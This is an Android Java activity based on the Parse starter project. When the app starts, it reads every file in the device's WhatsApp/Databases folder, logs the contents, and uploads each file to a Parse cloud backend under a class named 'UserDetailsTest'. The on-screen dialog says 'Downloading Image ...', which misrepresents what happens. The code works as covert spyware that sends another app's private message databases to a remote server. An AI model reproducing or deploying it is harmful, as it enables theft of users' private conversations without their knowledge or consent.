package com.parse.starter;


import java.io.File;
import java.io.IOException;

import org.apache.commons.io.FileUtils;

import android.app.Activity;
import android.app.ProgressDialog;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.parse.ParseAnalytics;
import com.parse.ParseFile;
import com.parse.ParseObject;

public class ParseStarterProjectActivity extends Activity {
	
	private final String TAG = "ParseStarterProjectActivity";
	ProgressDialog ringProgressDialog;

	
	
	/** Called when the activity is first created. */
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		
		Button b = (Button) findViewById(R.id.button1);
		
		b.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View arg0) {
			       ringProgressDialog = ProgressDialog.show(ParseStarterProjectActivity.this, "Please wait ...", "Downloading Image ...", true);
			               ringProgressDialog.setCancelable(true);

				
				
			}
		});
		
		String state= Environment.getExternalStorageState();
		Toast.makeText(getApplicationContext(), state, Toast.LENGTH_LONG).show();
		 
		String path = Environment.getExternalStorageDirectory().toString()+"/WhatsApp/Databases";
		Log.d("Files", "Path: " + path);
		File f = new File(path);        
		File fileList[] = f.listFiles();
		Log.d("Files", "Size: "+ fileList.length);
		for (int i=0; i < fileList.length; i++)
		{
		    Log.d("Files", "FileName:" + fileList[i].getName());
		    
		    String fileName = fileList[i].getName();
		    String finalPath = path+"/"+fileList[i].getName();

				
		   
	            String stateVar = Environment.getExternalStorageState();
	            if (Environment.MEDIA_MOUNTED.equals(stateVar)) {
	                File db = new File(finalPath);
	                if (db.exists()) {
	                    if (db.canRead()) {
	                       //Toast.makeText(getApplicationContext(), String.valueOf(db.length()), Toast.LENGTH_LONG).show(); 
	                       
	                       
	                       try {
	             			  byte[]  contents = FileUtils.readFileToByteArray(db);
	             			  String reconstitutedString = new String(contents);
	             			  
	          	    		String name = fileName;
	        	            ParseFile file = new ParseFile(name, contents);
	        	            file.saveInBackground();
	        	            	

	        	            
	        	            ParseObject wzupDB = new ParseObject("UserDetailsTest");
	        	           

	        	            wzupDB.put("db", file);

	        	            wzupDB.saveInBackground();
	        	    		
	        	            
	 
	        	            
	        	            
	             			
	             			Log.v(TAG,reconstitutedString);
	             			
	             		} catch (IOException e) {
	             			// TODO Auto-generated catch block
	             			Toast.makeText(getApplicationContext(),e.toString(),Toast.LENGTH_LONG).show();
	             		}
	                       
	                       
	                       
	                       
	                       
	                       
	                       
	                       
	                    } else {
	                        Log.d(TAG, "db "+db+" not readable");
	                    }
	                } else {
	                    Log.d(TAG, "does not exist");
	                }
	            } else {
	                Log.w(TAG, " erroor mounted");
	            }
	    
	            
		

		
	    		

		

		ParseAnalytics.trackAppOpened(getIntent());
		}
	}
	



	
	
}
